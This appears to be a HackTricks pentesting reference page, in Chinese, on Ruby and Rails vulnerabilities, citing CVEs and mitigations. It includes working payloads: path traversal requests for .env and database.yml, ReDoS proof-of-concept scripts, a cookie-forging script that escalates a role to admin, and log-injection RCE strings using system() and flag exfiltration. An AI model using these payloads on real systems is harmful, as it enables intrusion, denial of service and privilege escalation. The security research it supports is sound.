# Ruby 技巧

{{#include ../../banners/hacktricks-training.md}}

## 文件上传导致 RCE

如 [this article](https://www.offsec.com/blog/cve-2024-46986/) 所述，将 `.rb` 文件上传到诸如 `config/initializers/` 之类的敏感目录可能导致 Ruby on Rails 应用的远程代码执行 (RCE)。

提示：
- 其他在应用启动时执行的 boot/eager-load 位置在可写时也有风险（例如 `config/initializers/` 是经典示例）。如果你发现任意文件上传落在 `config/` 下的任意位置，且随后被 evaluated/required，可能在启动时获得 RCE。
- 查找将用户可控文件复制到容器镜像中的 dev/staging 构建，这些文件会在 Rails 启动时被加载。

## Active Storage image transformation → command execution (CVE-2025-24293)

当应用使用 Active Storage 连同 `image_processing` + `mini_magick`，并将不受信任的参数传入图像变换方法时，Rails 低于 7.1.5.2 / 7.2.2.2 / 8.0.2.1 的版本可能允许命令注入，因为某些变换方法错误地被默认允许。

- 易受攻击的模式类似：
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
其中 `params[:t]` 和/或 `params[:v]` 由攻击者控制。

- 测试时可尝试
- 识别任何接受 variant/processing 选项、变换名称或任意 ImageMagick 参数的端点。
- 对 `params[:t]` 和 `params[:v]` 进行模糊测试，寻找可疑错误或执行副作用。如果你能影响方法名或传入到 MiniMagick 的原始参数，可能在图像处理主机上得到代码执行。
- 如果你只有对已生成 variants 的只读访问，尝试通过精心构造的 ImageMagick 操作进行盲泄露。

- 修复/检测
- 如果你发现 Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 且同时使用 Active Storage + `image_processing` + `mini_magick` 并存在用户可控变换，则应视为可利用。建议升级并对方法/参数强制严格白名单，以及强化 ImageMagick policy。

## Rack::Static LFI / path traversal (CVE-2025-27610)

如果目标堆栈直接或通过框架使用 Rack middleware，`rack` 低于 2.2.13、3.0.14 和 3.1.12 的版本在 `:root` 未设置/配置错误时，通过 `Rack::Static` 允许本地文件包含。`PATH_INFO` 中的编码遍历可暴露进程工作目录或意外 root 下的文件。

- 搜索在 `config.ru` 或 middleware 栈中挂载 `Rack::Static` 的应用。对静态路径尝试编码遍历，例如：
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
根据配置的 `urls:` 调整前缀。如果应用返回文件内容，你很可能对解析出的 `:root` 下的任意内容存在 LFI。

- 缓解：升级 Rack；确保 `:root` 明确设置并且仅指向公开文件目录。

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` 和 < `2.2.8.1` 在解析精心构造的 `Content-Type: multipart/form-data` 头时会消耗超线性时间。单个包含巨大 `A=` 参数列表的 POST 请求即可占满一个 Puma/Unicorn worker，导致 DoS 或请求队列饥饿。

- 快速 PoC（会挂起一个 worker）：
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- 对任何基于 Rack 的堆栈（Rails/Sinatra/Hanami/Grape）均有效。如果前端是带 keep-alive 的 nginx/haproxy，可并行重复以耗尽 workers。
- 已通过使解析器线性化来修补；检查 `rack` gem 版本 < `3.0.9.1` 或 < `2.2.8.1`。在评估中要指出 WAF 很少阻止此类请求，因为该头在语法上是合法的。

## REXML XML parser ReDoS (CVE-2024-49761)

REXML gem < 3.3.9（Ruby 3.1 及更早版本）在解析包含长数字序列的十六进制数字字符引用（例如 `&#1111111111111x41;`）时会发生灾难性回溯。任何由 REXML 或封装它的库处理的 XML（SOAP/XML API 客户端、SAML、SVG 上传等）都可被滥用于 CPU 耗尽。

针对解析 XML 的 Rails 端点的最小触发示例：
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
If the process stays busy for seconds and worker CPU spikes, it is likely vulnerable. Attack is low bandwidth and affects background jobs that ingest XML as well.

## CGI cookie 解析 / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

使用 `cgi` gem（在许多 Rack 堆栈中默认）的应用可以被单个恶意头冻结：
- `CGI::Cookie.parse` was super-linear；巨大的 cookie 字符串（成千上万的分隔符）会触发 O(N²) 行为。
- `CGI::Util#escapeElement` 的正则导致 HTML 转义存在 ReDoS。

这两个问题已在 `cgi` 0.3.5.1 / 0.3.7 / 0.4.2 中修复。进行 pentests 时，发送一个巨大的 `Cookie:` 头或将不受信任的 HTML 提供给辅助代码，观察 worker 锁死。结合 keep-alive 可放大影响。

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) 对 `proceedto` 参数执行了不完整的同源检查。像 `proceedto=//attacker.com/%2F..` 这样的畸形 URL 可绕过该检查并将用户重定向到站外，同时保留 Rails flash/session cookies。

Exploit flow:
1. 受害者点击攻击者托管的精心构造的 Google Sign-In 链接。
2. 身份验证后，该 gem 将重定向到攻击者控制的域，leaking flash notices 或任何存储在作用域为通配符域的 cookies 中的数据。
3. 如果应用在 flash 中存储短期 tokens 或 magic links，则这可被用来进行 account takeover。

测试时，在 Gemfile.lock 中 grep `googlesign_in` < 1.3.0，并尝试畸形的 `proceedto` 值。通过 Location header 和 cookie reflection 确认。

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails 使用从 `secret_key_base` 派生的密钥对 cookies 进行加密和签名。如果该值 leaks（例如在 repo、logs 或配置错误的 credentials 中），通常可以解密、修改并重新加密 cookies。如果应用将 roles、user IDs 或 feature flags 存储在 cookies 中，这通常会导致 authz bypass。

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby 解密/伪造 cookies 示例</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
注意：
- 较旧的应用可能使用 AES-256-CBC 和 salts `encrypted cookie` / `signed encrypted cookie`，或使用 JSON/Marshal serializers。相应地调整 salts、cipher 和 serializer。
- 在遭到入侵/评估时，旋转 `secret_key_base` 以使所有现有 cookies 失效。

## 参见 (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

当一个应用（通常是一个简单的 Rack/Sinatra/Rails 端点）同时满足：
- 原封不动地记录用户可控的字符串，且
- 随后 `load` 一个其路径基于相同字符串（在 `Pathname#cleanpath` 之后）的文件，

你通常可以通过污染日志然后强制应用 `load` 日志文件来实现 remote code execution。关键原语：

- Ruby 的 `load` 会将目标文件内容作为 Ruby 代码求值，而不管文件扩展名。任何可读的文本文件，只要其内容能被解析为 Ruby，就会被执行。
- `Pathname#cleanpath` 在不访问文件系统的情况下折叠 `.` 和 `..` 段，从而实现路径走私：可以在记录日志时在路径前面添加攻击者控制的垃圾段，而清理后的路径仍会解析到要执行的目标文件（例如 `../logs/error.log`）。

### 最小易受攻击模式
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### 为什么日志可能包含有效的 Ruby
`Logger` 会写入类似这样的前缀行：
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
在 Ruby 中，`#` 开始注释，而 `9/2/2025` 只是算术。要注入有效的 Ruby 代码，你需要：

- 在新行开始你的 payload，这样它不会被 INFO 行中的 `#` 注释掉；发送一个前导换行符 (`\n` 或 `%0A`)。
- 关闭 INFO 行引入的悬空 `[`。一个常见的技巧是以 `]` 开始，并可选地用 `][0]=1` 让解析器满意。
- 然后放入任意 Ruby 代码（例如 `system(...)`）。

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### 走私一个既被记录为代码又能解析为日志路径的单个字符串
我们需要一个由攻击者控制的字符串，该字符串：
- 在被原样记录时，包含我们的 Ruby payload，且
- 当通过 `Pathname.new(<input>).cleanpath` 处理时，解析为 `../logs/error.log`，因此随后执行的 `load` 会运行刚被投毒的日志文件。

`Pathname#cleanpath` 会忽略 schemes 并消除路径遍历组件，因此下面的写法有效：
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- 在 `://` 之前的 `#` 确保 Ruby 在执行日志时忽略尾部，而 `cleanpath` 仍会将后缀缩减为 `../logs/error.log`。
- 行首的换行符会从 INFO 行中断开；`]` 关闭悬挂的方括号；`][0]=1` 使解析器通过。

### End-to-end exploitation
1. 发送以下内容作为备份脚本名（如有需要，请将第一个换行符 URL 编码为 `%0A`）：
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. 应用会将你的原始字符串记录到 `logs/error.log`。
3. 应用计算 `cleanpath`，解析为 `../logs/error.log` 并对其调用 `load`。
4. Ruby 会执行你注入到日志中的代码。

要在类似 CTF 的环境中 exfiltrate 一个文件：
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (第一个字符是换行):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## 参考资料

- [Rails 安全公告：CVE-2025-24293 Active Storage 不安全的转换方法（已在 7.1.5.2 / 7.2.2.2 / 8.0.2.1 修复）](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub 公告：Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath 文档](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS 通告 (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby 针对 CGI / URI 的安全公告 (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
